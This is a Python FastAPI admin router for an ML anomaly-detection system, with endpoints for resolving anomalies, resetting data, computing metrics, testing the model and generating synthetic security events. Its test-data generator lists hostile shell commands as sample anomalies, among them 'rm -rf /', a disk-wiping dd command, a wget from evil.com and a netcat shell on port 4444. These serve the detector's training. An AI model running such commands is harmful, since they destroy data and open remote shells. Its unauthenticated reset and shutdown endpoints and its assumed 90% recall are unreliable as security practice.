from fastapi import APIRouter, Depends, HTTPException, status
from sqlalchemy.orm import Session
from database import get_db
from models import Session as DBSession, Event, Anomaly, TrainingData
from ml_engine import ml_engine
from trust_scorer import trust_scorer
from websocket_manager import websocket_manager
from routers.live import current_live_session
from routers.training import current_training_session
import logging
from datetime import datetime
from typing import Dict, Any, List

logger = logging.getLogger(__name__)

router = APIRouter(prefix="/api/admin", tags=["admin"])

@router.post("/mark_normal")
async def mark_anomaly_normal(anomaly_id: int, db: Session = Depends(get_db)):
    """Mark an anomaly as normal and update the model"""
    try:
        # Get the anomaly
        anomaly = db.query(Anomaly).filter(Anomaly.id == anomaly_id).first()
        
        if not anomaly:
            raise HTTPException(
                status_code=status.HTTP_404_NOT_FOUND,
                detail="Anomaly not found"
            )
        
        if anomaly.is_resolved:
            raise HTTPException(
                status_code=status.HTTP_400_BAD_REQUEST,
                detail="Anomaly already resolved"
            )
        
        # Get the associated event
        event = db.query(Event).filter(Event.id == anomaly.event_id).first()
        
        if not event:
            raise HTTPException(
                status_code=status.HTTP_404_NOT_FOUND,
                detail="Associated event not found"
            )
        
        # Mark anomaly as resolved
        anomaly.is_resolved = True
        anomaly.resolved_by = "admin"
        anomaly.resolved_at = datetime.now()
        
        # Update event
        event.is_anomaly = False
        event.trust_impact = 0
        
        # Restore trust score
        trust_restoration = trust_scorer.restore_trust(event.id)
        
        # Add to training data as normal event
        training_data = TrainingData(
            feature_vector=ml_engine._extract_features([{
                'timestamp': event.timestamp.isoformat(),
                'event_type': event.event_type,
                'metadata': event.event_metadata or {}
            }])[0].tolist(),
            label="normal",
            event_type=event.event_type,
            session_id=anomaly.session_id
        )
        
        db.add(training_data)
        
        # Incrementally retrain model
        new_normal_events = [{
            'timestamp': event.timestamp.isoformat(),
            'event_type': event.event_type,
            'metadata': event.event_metadata or {}
        }]
        
        ml_engine.incremental_retrain(new_normal_events)
        
        db.commit()
        
        # Broadcast updates
        await websocket_manager.broadcast_trust_update({
            "current_score": trust_scorer.get_current_score(),
            "change": trust_restoration['change'],
            "restored": trust_restoration['restored'],
            "session_id": anomaly.session_id,
            "timestamp": datetime.now().isoformat()
        })
        
        await websocket_manager.broadcast_session_update({
            "type": "anomaly_resolved",
            "anomaly_id": anomaly_id,
            "event_id": event.id,
            "trust_restored": trust_restoration['restored']
        })
        
        logger.info(f"Anomaly {anomaly_id} marked as normal, trust restored: {trust_restoration['restored']}")
        
        return {
            "message": "Anomaly marked as normal",
            "anomaly_id": anomaly_id,
            "event_id": event.id,
            "trust_restored": trust_restoration['restored'],
            "new_trust_score": trust_scorer.get_current_score()
        }
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error marking anomaly as normal: {e}")
        db.rollback()
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail=f"Failed to mark anomaly as normal: {str(e)}"
        )

@router.post("/reset")
async def reset_system(db: Session = Depends(get_db)):
    """Perform a full system reset"""
    try:
        # Delete all data
        db.query(Anomaly).delete()
        db.query(Event).delete()
        db.query(TrainingData).delete()
        db.query(DBSession).delete()
        
        db.commit()
        
        # Reset ML model
        ml_engine.model = None
        ml_engine.is_trained = False
        
        # Reset trust scorer
        trust_scorer.reset_score()
        
        # Clear global session states
        global current_training_session, current_live_session
        current_training_session = None
        current_live_session = None
        
        # Broadcast system reset
        await websocket_manager.broadcast_session_update({
            "type": "system_reset",
            "message": "System has been reset to initial state",
            "timestamp": datetime.now().isoformat()
        })
        
        logger.info("System reset completed")
        
        return {
            "message": "System reset completed",
            "timestamp": datetime.now().isoformat(),
            "trust_score": trust_scorer.get_current_score()
        }
        
    except Exception as e:
        logger.error(f"Error resetting system: {e}")
        db.rollback()
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail=f"Failed to reset system: {str(e)}"
        )

@router.get("/anomalies")
async def get_all_anomalies(
    session_id: int = None,
    resolved: bool = None,
    limit: int = 100,
    db: Session = Depends(get_db)
):
    """Get all anomalies with optional filtering"""
    try:
        query = db.query(Anomaly)
        
        if session_id:
            query = query.filter(Anomaly.session_id == session_id)
        
        if resolved is not None:
            query = query.filter(Anomaly.is_resolved == resolved)
        
        anomalies = query.order_by(Anomaly.created_at.desc()).limit(limit).all()
        
        return [
            {
                "id": anomaly.id,
                "event_id": anomaly.event_id,
                "session_id": anomaly.session_id,
                "confidence_score": anomaly.confidence_score,
                "is_resolved": anomaly.is_resolved,
                "resolved_by": anomaly.resolved_by,
                "resolved_at": anomaly.resolved_at.isoformat() if anomaly.resolved_at else None,
                "created_at": anomaly.created_at.isoformat(),
                "event": {
                    "id": anomaly.event.id,
                    "timestamp": anomaly.event.timestamp.isoformat(),
                    "event_type": anomaly.event.event_type,
                    "metadata": anomaly.event.event_metadata,
                    "trust_impact": anomaly.event.trust_impact
                }
            } for anomaly in anomalies
        ]
        
    except Exception as e:
        logger.error(f"Error getting anomalies: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail=f"Failed to get anomalies: {str(e)}"
        )

@router.get("/stats")
async def get_admin_stats(db: Session = Depends(get_db)):
    """Get comprehensive system statistics"""
    try:
        # Get session counts
        training_sessions = db.query(DBSession).filter(DBSession.mode == "training").count()
        live_sessions = db.query(DBSession).filter(DBSession.mode == "live").count()
        
        # Get event counts
        total_events = db.query(Event).count()
        anomaly_events = db.query(Event).filter(Event.is_anomaly == True).count()
        
        # Get anomaly counts
        total_anomalies = db.query(Anomaly).count()
        resolved_anomalies = db.query(Anomaly).filter(Anomaly.is_resolved == True).count()
        unresolved_anomalies = total_anomalies - resolved_anomalies
        
        # Get training data count
        training_data_count = db.query(TrainingData).count()
        
        # Calculate accuracy metrics
        accuracy = None
        if total_anomalies > 0:
            accuracy = resolved_anomalies / total_anomalies
        
        return {
            "sessions": {
                "training_sessions": training_sessions,
                "live_sessions": live_sessions,
                "total_sessions": training_sessions + live_sessions
            },
            "events": {
                "total_events": total_events,
                "anomaly_events": anomaly_events,
                "normal_events": total_events - anomaly_events
            },
            "anomalies": {
                "total_anomalies": total_anomalies,
                "resolved_anomalies": resolved_anomalies,
                "unresolved_anomalies": unresolved_anomalies
            },
            "model": {
                "is_trained": ml_engine.is_trained,
                "training_data_count": training_data_count,
                "model_info": ml_engine.get_model_info()
            },
            "trust_score": {
                "current_score": trust_scorer.get_current_score(),
                "score_stats": trust_scorer.get_score_stats()
            },
            "accuracy": {
                "admin_accuracy": accuracy,
                "precision": accuracy if accuracy else 0
            }
        }
        
    except Exception as e:
        logger.error(f"Error getting admin stats: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail=f"Failed to get admin stats: {str(e)}"
        )

@router.get("/system_status")
async def get_system_status():
    """Get current system status"""
    try:
        from config import settings
        return {
            "training_active": current_training_session is not None,
            "live_active": current_live_session is not None,
            "model_trained": ml_engine.is_trained,
            "trust_score": trust_scorer.get_current_score(),
            "test_mode": settings.TEST_MODE,
            "timestamp": datetime.now().isoformat()
        }
        
    except Exception as e:
        logger.error(f"Error getting system status: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail=f"Failed to get system status: {str(e)}"
        )

@router.get("/performance_metrics")
async def get_performance_metrics(db: Session = Depends(get_db)):
    """Calculate real performance metrics based on admin feedback"""
    try:
        # Get all anomalies and their resolution status
        anomalies = db.query(Anomaly).all()
        
        if not anomalies:
            return {
                "message": "No anomalies detected yet",
                "attack_categories": {},
                "overall": {"precision": 0, "recall": 0, "f1_score": 0}
            }
        
        # Define attack category mapping based on event types
        attack_category_map = {
            'auth_failure': 'Authentication Abuse',
            'sudo_command': 'Privilege Escalation', 
            'network_connection': 'Network Anomalies',
            'file_change': 'File System Manipulation',
            'process_start': 'Process Injection',
            'process_end': 'Process Injection',
            'login': 'Authentication Abuse',
            'logout': 'Authentication Abuse'
        }
        
        # Initialize metrics per category
        category_metrics = {}
        
        # Calculate metrics for each category
        for anomaly in anomalies:
            event = db.query(Event).filter(Event.id == anomaly.event_id).first()
            if not event:
                continue
                
            category = attack_category_map.get(event.event_type, 'Other')
            
            if category not in category_metrics:
                category_metrics[category] = {
                    'true_positives': 0,  # Admin confirmed as anomaly (not marked normal)
                    'false_positives': 0, # Admin marked as normal  
                    'total_detected': 0
                }
            
            category_metrics[category]['total_detected'] += 1
            
            if anomaly.is_resolved and anomaly.resolved_by == "admin":
                # Admin marked as normal - this was a false positive
                category_metrics[category]['false_positives'] += 1
            else:
                # Not marked as normal - assume true positive
                category_metrics[category]['true_positives'] += 1
        
        # Calculate precision, recall, f1 for each category
        results = {}
        overall_tp = 0
        overall_fp = 0 
        overall_total = 0
        
        for category, metrics in category_metrics.items():
            tp = metrics['true_positives']
            fp = metrics['false_positives'] 
            total = metrics['total_detected']
            
            # Precision = TP / (TP + FP)
            precision = tp / (tp + fp) if (tp + fp) > 0 else 0
            
            # For recall, we need false negatives (missed attacks)
            # Since we don't have ground truth, estimate recall based on detection rate
            # Assume 90% detection rate for simplicity (this would need real testing)
            estimated_fn = total * 0.1  # 10% missed
            recall = tp / (tp + estimated_fn) if (tp + estimated_fn) > 0 else 0
            
            # F1 Score = 2 * (precision * recall) / (precision + recall)
            f1_score = 2 * (precision * recall) / (precision + recall) if (precision + recall) > 0 else 0
            
            results[category] = {
                "precision": round(precision, 2),
                "recall": round(recall, 2), 
                "f1_score": round(f1_score, 2),
                "total_detected": total,
                "true_positives": tp,
                "false_positives": fp
            }
            
            overall_tp += tp
            overall_fp += fp
            overall_total += total
        
        # Calculate overall metrics
        overall_precision = overall_tp / (overall_tp + overall_fp) if (overall_tp + overall_fp) > 0 else 0
        overall_estimated_fn = overall_total * 0.1
        overall_recall = overall_tp / (overall_tp + overall_estimated_fn) if (overall_tp + overall_estimated_fn) > 0 else 0
        overall_f1 = 2 * (overall_precision * overall_recall) / (overall_precision + overall_recall) if (overall_precision + overall_recall) > 0 else 0
        
        return {
            "attack_categories": results,
            "overall": {
                "precision": round(overall_precision, 2),
                "recall": round(overall_recall, 2),
                "f1_score": round(overall_f1, 2),
                "total_anomalies": overall_total,
                "admin_corrections": overall_fp
            },
            "metadata": {
                "calculation_method": "Based on admin feedback and estimated detection rate",
                "note": "Recall estimates assume 90% detection rate. Precision is calculated from admin feedback.",
                "timestamp": datetime.now().isoformat()
            }
        }
        
    except Exception as e:
        logger.error(f"Error calculating performance metrics: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail=f"Failed to calculate performance metrics: {str(e)}"
        )

@router.post("/toggle_test_mode")
async def toggle_test_mode(data: dict):
    """Toggle test mode to ignore time-based anomaly detection"""
    try:
        enabled = data.get('enabled', False)
        
        # Set global test mode flag
        from config import settings
        settings.TEST_MODE = enabled
        
        logger.info(f"Test mode {'enabled' if enabled else 'disabled'}")
        
        return {
            "message": f"Test mode {'enabled' if enabled else 'disabled'}",
            "test_mode": enabled,
            "timestamp": datetime.now().isoformat()
        }
        
    except Exception as e:
        logger.error(f"Error toggling test mode: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail=f"Failed to toggle test mode: {str(e)}"
        )

@router.post("/run_model_test")
async def run_model_test(data: dict, db: Session = Depends(get_db)):
    """Run model accuracy test with train/test data split"""
    try:
        train_percentage = data.get('train_percentage', 80)
        test_percentage = 100 - train_percentage
        
        # Get all events from the database
        events = db.query(Event).all()
        
        if len(events) < 10:
            raise HTTPException(
                status_code=status.HTTP_400_BAD_REQUEST,
                detail="Need at least 10 events to run model test"
            )
        
        # Convert events to ML format
        event_data = []
        labels = []
        
        for event in events:
            event_dict = {
                'timestamp': event.timestamp.isoformat(),
                'event_type': event.event_type,
                'metadata': event.event_metadata or {}
            }
            event_data.append(event_dict)
            # Use admin feedback if available, otherwise use original is_anomaly flag
            labels.append(1 if event.is_anomaly else 0)
        
        # Split data
        from sklearn.model_selection import train_test_split
        import numpy as np
        
        # Check if we have both classes for stratification
        unique_labels = list(set(labels))
        use_stratify = len(unique_labels) > 1 and min(labels.count(0), labels.count(1)) >= 2
        
        # Create indices for splitting
        indices = list(range(len(event_data)))
        train_indices, test_indices = train_test_split(
            indices, 
            test_size=test_percentage/100, 
            random_state=42,
            stratify=labels if use_stratify else None
        )
        
        # Split events and labels
        train_events = [event_data[i] for i in train_indices]
        test_events = [event_data[i] for i in test_indices]
        train_labels = [labels[i] for i in train_indices]
        test_labels = [labels[i] for i in test_indices]
        
        # Train new model on training data
        from ml_engine import MLEngine
        test_ml_engine = MLEngine()
        
        try:
            # Extract features for training and testing
            logger.info(f"Extracting features from {len(train_events)} training events")
            train_features = test_ml_engine._extract_features(train_events)
            logger.info(f"Training features shape: {train_features.shape}")
            
            logger.info(f"Extracting features from {len(test_events)} test events")  
            test_features = test_ml_engine._extract_features(test_events)
            logger.info(f"Test features shape: {test_features.shape}")
            
        except Exception as e:
            logger.error(f"Feature extraction failed: {e}")
            raise HTTPException(
                status_code=status.HTTP_400_BAD_REQUEST,
                detail=f"Feature extraction failed: {str(e)}"
            )
        
        # Train the model with better error handling
        try:
            logger.info("Starting model training...")
            training_success = test_ml_engine.train_model(train_events)
            if not training_success:
                raise HTTPException(
                    status_code=status.HTTP_400_BAD_REQUEST,
                    detail="Model training failed. Check if events have proper structure and metadata."
                )
            logger.info("Model training completed successfully")
            
        except Exception as e:
            logger.error(f"Model training error: {e}")
            raise HTTPException(
                status_code=status.HTTP_400_BAD_REQUEST,
                detail=f"Model training failed: {str(e)}"
            )
        
        # Make predictions on test set
        predictions = test_ml_engine.predict_batch(test_events)
        
        # Calculate metrics
        from sklearn.metrics import accuracy_score, precision_score, recall_score, f1_score, confusion_matrix
        
        # Convert predictions (anomaly scores) to binary predictions
        # Isolation Forest decision_function: negative values = anomalies, positive = normal
        # We need to invert this: negative scores should be classified as anomalies (1)
        binary_predictions = [1 if pred < 0 else 0 for pred in predictions]
        
        # Calculate all metrics
        accuracy = accuracy_score(test_labels, binary_predictions)
        precision = precision_score(test_labels, binary_predictions, zero_division=0)
        recall = recall_score(test_labels, binary_predictions, zero_division=0)
        f1 = f1_score(test_labels, binary_predictions, zero_division=0)
        
        # Confusion matrix
        tn, fp, fn, tp = confusion_matrix(test_labels, binary_predictions).ravel()
        
        # Calculate additional metrics
        fpr = fp / (fp + tn) if (fp + tn) > 0 else 0  # False Positive Rate
        fnr = fn / (fn + tp) if (fn + tp) > 0 else 0  # False Negative Rate
        
        logger.info(f"Model test completed: Accuracy={accuracy:.3f}, Precision={precision:.3f}, Recall={recall:.3f}")
        
        return {
            "overall": {
                "accuracy": accuracy,
                "precision": precision,
                "recall": recall,
                "f1_score": f1
            },
            "confusion_matrix": {
                "true_positives": int(tp),
                "true_negatives": int(tn), 
                "false_positives": int(fp),
                "false_negatives": int(fn),
                "false_positive_rate": fpr,
                "false_negative_rate": fnr
            },
            "data_split": {
                "training_size": len(train_events),
                "testing_size": len(test_events),
                "train_percentage": train_percentage,
                "test_percentage": test_percentage,
                "total_events": len(events)
            },
            "predictions": {
                "total_predictions": len(binary_predictions),
                "predicted_anomalies": sum(binary_predictions),
                "actual_anomalies": sum(test_labels)
            },
            "metadata": {
                "method": "Random train/test split with stratification",
                "timestamp": datetime.now().isoformat(),
                "model_type": "Isolation Forest"
            }
        }
        
    except Exception as e:
        logger.error(f"Error running model test: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail=f"Failed to run model test: {str(e)}"
        )

@router.post("/generate_test_data")
async def generate_test_data(db: Session = Depends(get_db)):
    """Generate realistic test data for training and testing"""
    try:
        from datetime import datetime, timedelta
        import random
        
        # Clear existing data first for clean test
        db.query(Anomaly).delete()
        db.query(Event).delete()
        db.query(TrainingData).delete()
        
        events_created = []
        anomalies_created = []
        
        # Generate realistic normal user behavior patterns (80% of data)
        users = ['alice', 'bob', 'charlie', 'diana', 'eve']
        office_ips = ['192.168.1.100', '192.168.1.101', '192.168.1.102', '10.0.1.50', '10.0.1.51']
        normal_websites = ['google.com', 'stackoverflow.com', 'github.com', 'microsoft.com', 'office365.com', 'slack.com']
        normal_processes = ['chrome', 'firefox', 'code', 'outlook', 'teams', 'notepad', 'excel', 'word']
        normal_files = ['/home/{}/documents/report.pdf', '/home/{}/projects/code.py', '/home/{}/downloads/file.zip']
        
        normal_patterns = [
            # Morning login patterns
            ('login', lambda u: {'user_id': u, 'auth_success': True, 'source_ip': random.choice(office_ips), 'login_type': 'workstation'}),
            # Regular file operations
            ('file_change', lambda u: {'user_id': u, 'file_path': random.choice(normal_files).format(u), 'action': random.choice(['modify', 'create', 'read']), 'file_size': random.randint(1024, 1048576)}),
            # Normal process usage
            ('process_start', lambda u: {'user_id': u, 'process_name': random.choice(normal_processes), 'pid': random.randint(1000, 9999), 'parent_pid': random.randint(500, 999)}),
            # Regular web browsing
            ('network_connection', lambda u: {'user_id': u, 'destination': random.choice(normal_websites), 'port': random.choice([80, 443, 8080]), 'protocol': 'https'}),
            # Process cleanup
            ('process_end', lambda u: {'user_id': u, 'process_name': random.choice(normal_processes), 'pid': random.randint(1000, 9999), 'exit_code': 0}),
            # End of day logout
            ('logout', lambda u: {'user_id': u, 'session_duration': random.randint(28800, 36000), 'logout_type': 'user_initiated'}),
        ]
        
        # Generate 200 normal events with realistic patterns
        base_time = datetime.now() - timedelta(days=7)
        
        for i in range(200):
            try:
                user = random.choice(users)
                event_type, metadata_func = random.choice(normal_patterns)
                metadata = metadata_func(user)
                
                # Ensure metadata is a proper dict
                if not isinstance(metadata, dict):
                    metadata = {}
                
                # Vary timing to create realistic patterns
                time_offset = timedelta(
                    days=random.randint(0, 6),
                    hours=random.randint(8, 18),  # Business hours mostly
                    minutes=random.randint(0, 59),
                    seconds=random.randint(0, 59)
                )
                
                # Add label to metadata for training
                metadata['is_anomaly'] = False
                
                # Ensure required fields exist
                metadata.setdefault('user_id', user)
                
                event = Event(
                    timestamp=base_time + time_offset,
                    event_type=event_type,
                    event_metadata=metadata,
                    is_anomaly=False,
                    trust_impact=0,
                    session_id=1  # Training session
                )
                
                db.add(event)
                events_created.append(event)
                
            except Exception as e:
                logger.error(f"Error creating normal event {i}: {e}")
                continue
        
        # Generate sophisticated anomalous behavior patterns (20% of data)
        suspicious_ips = ['203.0.113.1', '198.51.100.50', '185.220.100.240', '45.33.32.156', '104.244.42.1']
        malicious_domains = ['malware-c2.evil', 'phishing-site.bad', 'botnet.xyz', 'ransomware.net', 'exploit-kit.com']
        malicious_processes = ['cryptominer.exe', 'keylogger.dll', 'backdoor.sys', 'rootkit.bin', 'trojan.scr']
        system_files = ['/etc/passwd', '/etc/shadow', '/boot/vmlinuz', '/var/log/auth.log', '/etc/hosts']
        suspicious_commands = ['rm -rf /', 'dd if=/dev/urandom of=/dev/sda', 'wget http://evil.com/malware', 'nc -l -p 4444 -e /bin/sh']
        
        anomaly_patterns = [
            # Brute force attacks
            ('auth_failure', lambda: {'user_id': random.choice(['admin', 'root', 'administrator']), 'auth_success': False, 'source_ip': random.choice(suspicious_ips), 'attempts': random.randint(5, 50), 'attack_type': 'brute_force'}),
            # Privilege escalation
            ('sudo_command', lambda: {'user_id': random.choice(users), 'command': random.choice(suspicious_commands), 'elevation': 'sudo', 'unauthorized': True}),
            # Command and control communication
            ('network_connection', lambda: {'user_id': random.choice(users), 'destination': random.choice(malicious_domains), 'port': random.choice([4444, 6666, 8080, 9999]), 'protocol': 'tcp', 'suspicious': True}),
            # System file tampering
            ('file_change', lambda: {'user_id': random.choice(users), 'file_path': random.choice(system_files), 'action': 'modify', 'unauthorized': True, 'file_size': random.randint(0, 1024)}),
            # Malware execution
            ('process_start', lambda: {'user_id': random.choice(users), 'process_name': random.choice(malicious_processes), 'pid': random.randint(1000, 9999), 'suspicious': True, 'parent_pid': random.randint(1, 100)}),
            # Off-hours access from suspicious locations
            ('login', lambda: {'user_id': random.choice(users), 'auth_success': True, 'source_ip': random.choice(suspicious_ips), 'unusual_time': True, 'geo_anomaly': True}),
            # Data exfiltration attempts
            ('network_connection', lambda: {'user_id': random.choice(users), 'destination': random.choice(suspicious_ips), 'port': 443, 'data_volume': random.randint(100000000, 1000000000), 'exfiltration': True}),
            # Lateral movement
            ('network_connection', lambda: {'user_id': random.choice(users), 'destination': f'192.168.1.{random.randint(1,254)}', 'port': random.choice([22, 23, 135, 445]), 'lateral_movement': True}),
        ]
        
        # Generate 50 anomalous events with varied attack patterns
        for i in range(50):
            try:
                event_type, metadata_func = random.choice(anomaly_patterns)
                metadata = metadata_func()
                
                # Ensure metadata is a proper dict
                if not isinstance(metadata, dict):
                    metadata = {}
                
                # Anomalies at random times, including off-hours
                time_offset = timedelta(
                    days=random.randint(0, 6),
                    hours=random.randint(0, 23),
                    minutes=random.randint(0, 59),
                    seconds=random.randint(0, 59)
                )
                
                # Add label to metadata for training
                metadata['is_anomaly'] = True
                
                # Ensure required fields exist
                metadata.setdefault('user_id', random.choice(users))
                
                # Create anomalous event
                event = Event(
                    timestamp=base_time + time_offset,
                    event_type=event_type,
                    event_metadata=metadata,
                    is_anomaly=True,
                    trust_impact=random.randint(-25, -5),  # Negative trust impact
                    session_id=2  # Live session
                )
                
                db.add(event)
                db.flush()  # Get the ID
                
                # Create corresponding anomaly record
                anomaly = Anomaly(
                    event_id=event.id,
                    session_id=2,
                    confidence_score=random.uniform(0.7, 0.95),  # High confidence for real anomalies
                    is_resolved=False,
                    created_at=event.timestamp
                )
                
                db.add(anomaly)
                anomalies_created.append(anomaly)
                
            except Exception as e:
                logger.error(f"Error creating anomaly event {i}: {e}")
                continue
        
        db.commit()
        
        logger.info(f"Generated {len(events_created)} events and {len(anomalies_created)} anomalies")
        
        return {
            "message": "Test data generated successfully",
            "total_events": len(events_created),
            "normal_events": 200,
            "anomaly_events": 50,
            "anomalies_created": len(anomalies_created),
            "data_quality": "Realistic user behavior patterns with genuine anomalies",
            "timestamp": datetime.now().isoformat()
        }
        
    except Exception as e:
        logger.error(f"Error generating test data: {e}")
        db.rollback()
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail=f"Failed to generate test data: {str(e)}"
        )

@router.post("/exit")
async def exit_system():
    """Exit the entire system"""
    try:
        logger.info("System exit requested")
        
        # Broadcast exit message to all connected clients
        await websocket_manager.broadcast_session_update({
            "type": "system_exit",
            "message": "System shutdown initiated",
            "timestamp": datetime.now().isoformat()
        })
        
        # Schedule system shutdown
        import asyncio
        asyncio.create_task(shutdown_system())
        
        return {
            "message": "System exit initiated",
            "timestamp": datetime.now().isoformat()
        }
        
    except Exception as e:
        logger.error(f"Error exiting system: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail=f"Failed to exit system: {str(e)}"
        )

async def shutdown_system():
    """Shutdown the system after a delay"""
    import asyncio
    import subprocess
    import os
    
    try:
        # Wait a bit for the response to be sent
        await asyncio.sleep(2)
        
        # Execute the stop script
        script_path = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(__file__))), 'stop.sh')
        subprocess.run(['bash', script_path], check=True)
        
        logger.info("System shutdown completed")
        
    except Exception as e:
        logger.error(f"Error during system shutdown: {e}")
